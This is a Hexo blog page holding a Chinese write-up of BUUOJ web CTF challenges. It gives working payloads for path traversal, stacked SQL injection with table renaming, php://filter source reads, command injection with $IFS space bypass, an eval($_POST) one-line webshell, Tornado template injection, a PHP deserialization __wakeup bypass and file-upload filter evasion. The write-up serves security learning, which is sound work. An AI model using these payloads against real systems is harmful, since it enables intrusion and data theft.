@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>BUUOJ WEB-wp | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[HCTF 2018]WarmUp check函数有三个地方可以返回true，include可以执行文件内容，hint告诉了我们flag在ffffllllaaaagggg中，大概率是在根目录里，用..&#x2F;慢慢退到根目录找到ffffllllaaaagggg读出来就好 &#x2F;?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg可以返回第二个(php后面的?在htm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ WEB-wp">
+<meta property="og:url" content="http://example.com/2021/04/18/BUUOJ-WEB-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[HCTF 2018]WarmUp check函数有三个地方可以返回true，include可以执行文件内容，hint告诉了我们flag在ffffllllaaaagggg中，大概率是在根目录里，用..&#x2F;慢慢退到根目录找到ffffllllaaaagggg读出来就好 &#x2F;?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg可以返回第二个(php后面的?在htm">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-04-18T10:57:55.916Z">
+<meta property="article:modified_time" content="2021-04-19T13:51:21.603Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-BUUOJ-WEB-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/18/BUUOJ-WEB-wp/" class="article-date">
+  <time datetime="2021-04-18T10:57:55.916Z" itemprop="datePublished">2021-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      BUUOJ WEB-wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>[HCTF 2018]WarmUp</strong></p>
+<p>check函数有三个地方可以返回true，include可以执行文件内容，hint告诉了我们flag在ffffllllaaaagggg中，大概率是在根目录里，用<code>../</code>慢慢退到根目录找到ffffllllaaaagggg读出来就好</p>
+<p>/?file=source.php?../../../../../ffffllllaaaagggg可以返回第二个(php后面的?在html权威指南读到过，是查询的意思)；而?file=source.php%253F../../../../../ffffllllaaaagggg可以返回第三个，因为%253F解码两次（服务器一次、函数本身有一次）就变成了’?’</p>
+<p><strong>[极客大挑战 2019]EasySQL1</strong></p>
+<p>对username用万能密码 1’ or 1=1# 即可</p>
+<p><strong>[强网杯 2019]随便注1</strong></p>
+<p>先用万能密码1’ or 1=1#发现每组数据有两个变量</p>
+<p>随后尝试联合注入，发现select被ban了</p>
+<p>再试堆叠注入发现可以，依次用1’;show databases;#、1’;show tables;#可以查出库名和表名</p>
+<p>查到两个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再查这两个表各自的列，用 1’;show columns from `1919810931114514;` 查得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1’;show columns from `words`;  查到</p>
+<p>(PS:这里不加反引号(`)直接查words也可以，但对上面的不行，反引号在mysql中用于表示库名、表名、字段名等，在确保不会引起歧义时可以不用。这里words不会歧义，但上面的表名可能会与本身名字的数字发生歧义，所以要用反引号，并且因为是表名所以不能用单引号或双引号。<strong>另外说一句，对mysql的反引号是引用表名、字段名、库名，而对php或者shell，反引号意味着将内容当做命令优先执行，将返回值作为结果使用)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag就在191xxx这个表中，但是我们没法通过show读出来flag。回想到191xxx表中有一个成员，words表中有俩成员，我们可以猜出一开始万能密码的回显就是words的回显。那么我们就先给191增加一个成员id，再将191xxx中的flag改名为data，之后将words表改名为words1,191xxx改名为words，就可以通过读我们改名后的words得到flag了。</p>
+<p>具体payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;alter table \&#96;1919810931114514\&#96; add id int(10) default &#39;1&#39;;</span><br><span class="line"></span><br><span class="line">1&#39;;alter table \&#96;1919810931114514\&#96; change flag data varchar(100);#</span><br><span class="line"></span><br><span class="line">1&#39;;alter table words rename to words1;alter table \&#96;1919810931114514\&#96; rename to words;#</span><br></pre></td></tr></table></figure>
+
+<p>之后再万能密码就可以得到flag了</p>
+<p><strong>[极客大挑战 2019]Havefun1</strong></p>
+<p>看下源码啥都有了，直接一个GET请求，结束</p>
+<p><strong>[SUCTF 2019]EasySQL1</strong></p>
+<p>这题目前理解不够，先不写了</p>
+<p><strong>[ACTF2020 新生赛]Include1</strong></p>
+<p>点进去看到url多了一个?file=flag.php，感觉flag应该写在这个文件的注释里了，结合题目include感觉应该是php伪协议</p>
+<p>构造?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>得到一串Base64码，解码就可以得到flag了</p>
+<p><strong>[极客大挑战 2019]SecretFile1</strong></p>
+<p>让我回去仔细看看？看network发现一个302响应的action.php，用burpsuite拦一下看注释得到secr3t.php，访问secr3t.php又是熟悉的代码审计。告诉我们文件在flag.php里，访问说我们看不到，肯定又是放在注释了，结合secr3t.php中的include，直接用php伪协议构造/secr3t.php？file=php://filter/read=convert.base64-encode/resource=flag.php，得到的字符串再base64解码就得到flag。</p>
+<p><strong>[极客大挑战 2019]LoveSQL1</strong></p>
+<p>username猜admin，密码万能密码就出来了</p>
+<p><strong>[ACTF2020 新生赛]Exec1</strong></p>
+<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/xuejinyan123/article/details/81030799?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1331989.2056.16187427796174155&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">linux的一些特殊符号</a>，主要提两个，第一个是管道符(|)另一个是连接符(;)。他们两个都能连接n个命令并执行。不同点在于管道符会把前面的命令的返回值传给后面的命令作为参数，并把最后一个命令的返回值作为总的返回值；而连接符不存在返回值，只是依次执行命令。</p>
+<p>因此我们直接127.0.0.1|ls /发现flag文件，直接127.0.0.1|cat /flag就得到flag</p>
+<p><strong>[GXYCTF2019]Ping Ping Ping1</strong></p>
+<p>?ip=127.0.0.1|ls，发现有两个文件flag.php和index.php</p>
+<p>?ip=127.0.0.1|cat flag.php发现空格被ban了，搜索空格过滤一个一个试发现$IFS$1可以绕过空格过滤，?ip=127.0.0.1|cat$IFS$1flag.php回显不一样，告诉说不能这么获得flag</p>
+<p>再去index.php看看，?ip=127.0.0.1|cat$IFS$1index.php代码审计，得到过滤的正则，考虑变量拼接构造?ip=127.0.0.1;w=g;cat$IFS$1fla$w.php，在注释里找到flag</p>
+<p>这里解释两个东西</p>
+<p>第一个问题</p>
+<p>首先是关于空格过滤用到的$IFS，$IFS是shell里的环境变量用于内部字段分隔符，可以设置分隔符为某个符号，默认值为空格、制表、空行。其中$IFS$9中的$9指的是传过来的第九个参数，只要不为0（0无意义）就会返回分隔符也就是空格。他没加{}的原因在于两个$已经足够保证能确定出$IFS了，而使用${IFS}则是为了防止与以IFS开头的变量混淆。</p>
+<p>第二个问题</p>
+<p>这道题和上道题不同，上道题既能用管道符也能用连接符，但这个题前面可以用管道符，最后一步用管道符?ip=127.0.0.1|w=g|cat$IFS$1fla$w.php却什么结果都得不到了，甚至?ip=127.0.0.1|w=g;cat$IFS$1fla$w.php也得不到结果，这是为什么？</p>
+<p>很简单，因为代码审计看到最后用的是print而不是include，print会将$a打印出来，而$a是什么？是我们得到的输入命令的返回值。只要我们使用管道符，相当于最后print(返回值)，中间的各个过程它内部实现后就挂掉了（相当于给黑盒封装了），只给我们最后一个返回值，而注释不算做返回值自然什么都读不到。而用连接符，虽然最后返回值也得不到flag，但是中间的过程不是被黑盒封起来的，我们自然可以获得里面的注释。</p>
+<p><strong>[极客大挑战 2019]Knife1</strong></p>
+<p>eval($_POST[“Syc”]);直接给出来的，真就白给，直接蚁剑/菜刀然后进根目录找flag就完事了，这里主要解释一下我们通过蚁剑到底做了什么。</p>
+<p>eval($_POST[“Syc”]);这句话是一句标准的一句话木马，eval这个函数在php中是可以用作执行命令的，他会把post上去的变量Syc的内容当做命令执行，而我们提供给蚁剑的密码就是这个，其实就是告诉蚁剑只要post一个叫做Syc的变量就可以用它执行命令了。蚁剑会用这个接口把它里面的文件全读出来给我们看，也就是说我不用蚁剑一点一点执行命令也能得到flag，但是蚁剑为我们做好了，更方便我们渗透而已。</p>
+<p><strong>[护网杯 2018]easy_tornado1</strong></p>
+<p>这是之前无数次劝退我的模板注入，我这次下定决心一定得给他搞会了。</p>
+<p>先说模板，其实就是可以通过的形式，将字符串当做代码执行并对页面进行渲染。题目中给了三个文件，依次点进去看。/flag.txt告诉我们flag就在/fllllllllllllag里；welcome.txt告诉我们render，查一下发现是tornado的一个渲染函数，考虑可能是模板注入；再看hint知道了filehash的计算方式。也就是说，我们只需要get递交filename=/fllllllllllllag然后算出相应的hash交上去就能拿到flag了。但是hash的计算方法中有一个cookie_secret是我们不知道的，需要先通过模板注入得到他。</p>
+<p>先找注入点也就是回显点，只递交filename=/fllllllllllllag进入/error?msg=Error，并且页面回显也是Error，试试error?msg=1发现果然页面回显1，注入点找到了。然后依次尝试，通过文档找tornado中一些可以直接使用的变量，最后找到handler.settings，注入获得cookie_secret，再hash以下得到flag。注意，handler这里指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是一些环境变量。<strong>记住，重点不在于这题是咋做出来的，而是学习遇到模板注入的大体思路是怎样的。</strong></p>
+<p>PS:<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/guide/templates.html">handler参考</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/web.html">RequestHandler.settings参考</a></p>
+<p><strong>[RoarCTF 2019]Easy Calc1</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102630714?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159108482119724843333506%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159108482119724843333506&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-1-102630714.pc_insert_v2&utm_term=%5BRoarCTF%202019%5DEasy%20Calc">参考网站</a></p>
+<p>知识点1：首先说明php的字符串解析特性，对于一个变量名，php在get或者post接收的时候会做两件事，第一件是删除空白符，第二件事将某些字符转变为下划线。比如参数%20news[id%00，php会把它存进$_GET[“news_id”]，也就是说原来的%20和%00删掉了，而”[“这种字符则被当做下划线处理了。</p>
+<p>知识点2：php常用函数：</p>
+<p>scandir(pos)，列出pos目录中的文件和目录，常用来找到flag的位置</p>
+<p>file_get_contents()，用于读取文件，在php伪协议里也出现过</p>
+<p>var_dump()：PHP中的调试函数,用于判断一个变量的类型与长度,并输出变量的数值。用var_dump打印所有的对象,可以查看对象内部的数据结构</p>
+<p>知识点3：对于某些特定字符被过滤，可以考虑用chr()绕过，例如单引号被过滤，可以用chr(47)代替</p>
+<p>回到题目，通过network可以看到calc.php的源码看到eval了，发现传不了字母，结合上面的绕过就很简单了</p>
+<p>先? num=print_r(scandir(chr(47)));得到flag位置为/flagg</p>
+<p>然后calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));得到flag</p>
+<p>PS：这里的waf我们是看不到的，calc.php的源码只是给了一个执行流程，后面还有过滤才是waf，就比如这里的字母过滤。</p>
+<p><strong>[极客大挑战 2019]Http1</strong></p>
+<p>经典中的经典，WEB签到题标准模板233</p>
+<p>一开始进去发现啥也没有？看一下源码发现了”氛围“被挂载了一个链接Secret.php，进入之后发现是喜闻乐见的改包环节。</p>
+<p>顺着他依次修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>
+
+<p>然后拿到flag。注意，127.0.0.1和localhost等价，同时XFF有些题可能变成Client-ip，不同题都试试。</p>
+<p><strong>[极客大挑战 2019]PHP1</strong></p>
+<p>题目说了有备份文件，直接御剑/dirsearch开扫</p>
+<p>得到<a target="_blank" rel="noopener" href="http://www.zip,下载得到一个压缩包,解压/">www.zip，下载得到一个压缩包，解压</a></p>
+<p>flag.php里的flag是假的，主要看index.php和class.php。</p>
+<p>index.php里有这么一段代码</p>
+<pre><code>include &#39;class.php&#39;;
+$select = $_GET[&#39;select&#39;];
+$res=unserialize(@$select);</code></pre>
+<p>说明我们可以get递交一个select变量通过反序列化来构造对象，再看class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个很显然就是我们需要构造的对象类了。查看代码逻辑知道了，只要我们构造出一个username为admin并且password为100的对象，并在他销毁时依然维持这两个成员内容不变就能得到flag，但是中间反序列化会调用__wakeup()函数，他会修改username。</p>
+<p>这里用到的知识点为：反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup( )的执行。</p>
+<p>具体关于反序列化的操作我都在另一篇博客给出了，在此不多赘述。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$obj&#x3D;new Name(&quot;admin&quot;,100);</span><br><span class="line">$s&#x3D;serialize($obj);</span><br><span class="line">print($s);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到payload：</p>
+<p>?select=O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
+<p>改成</p>
+<p>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
+<p>得到flag</p>
+<p><strong>[极客大挑战 2019]Upload1</strong></p>
+<p>文件上传漏洞很多都是写一句话木马然后蚁剑，难点在于如何绕过过滤</p>
+<p>首先，网页可能对文件格式进行过滤，这种一般都是根据Content-type判断的，可以通过修改Content-type绕过</p>
+<p>其次，网页可能对文件的名字进行过滤，比如检测到名字带有php时就禁止上传，这种可以通过更改为php,php3,php4,php5,phtml,pht等尝试绕过</p>
+<p>再有，网页可能对你文件的内容进行过滤，比如该题，一旦检测到内容带有”&lt;?”就会被过滤，这时要想别的构造方法绕过</p>
+<p>PS：对于服务器而言，他检测你的文件类型一定是从后向前找.xxx来判断的，比如你上传一个文件111.php;.jpg，那么他会被当做图片处理。也就是说，你可以直接上传一个php文件然后在burpsuite里修改Content-type绕过、也可以上传一个合法类型文件然后在burpsuite修改后缀为php，这两种本质相同，但一定要保证你最后上传上去的后缀名类型是可以被执行的（比如php）而不是jpg这种不可执行的文件。</p>
+<p>关于很多其他细节可以见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">参考</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/18/BUUOJ-WEB-wp/" data-id="cknopixip0001wsv08czbb33h" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/08/%E5%85%B3%E4%BA%8E%E7%BD%91%E5%85%B3%E3%80%81%E9%9A%A7%E9%81%93%E5%92%8C%E4%B8%AD%E7%BB%A7%E7%9A%84%E7%90%86%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">关于网关、隧道和中继的理解</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/04/18/BUUOJ-WEB-wp/">BUUOJ WEB-wp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/08/%E5%85%B3%E4%BA%8E%E7%BD%91%E5%85%B3%E3%80%81%E9%9A%A7%E9%81%93%E5%92%8C%E4%B8%AD%E7%BB%A7%E7%9A%84%E7%90%86%E8%A7%A3/">关于网关、隧道和中继的理解</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/05/%E5%85%B3%E4%BA%8EConnection%E9%A6%96%E9%83%A8%E5%92%8C%E5%93%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/">关于Connection首部和哑代理的问题</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/11/%E6%88%91%EF%BC%8C%E5%86%85%E5%8D%B7%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%80%85/">我，内卷的失败者</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/">Hgame题解</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
